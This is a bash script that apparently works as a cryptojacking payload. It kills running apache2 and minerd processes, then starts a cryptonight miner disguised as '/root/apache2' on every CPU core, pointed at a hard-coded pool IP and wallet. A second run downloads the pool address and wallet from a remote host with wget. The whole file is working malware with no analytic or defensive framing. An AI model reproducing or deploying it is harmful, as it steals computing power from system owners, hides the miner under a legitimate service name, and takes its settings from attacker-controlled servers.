#!/bin/bash
cd tanhuevon
git pull
killall apache2
killall  minerd
/root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
/root/apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u "`wget -q -O - sio.com.co/m/dirwallet.txt`+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
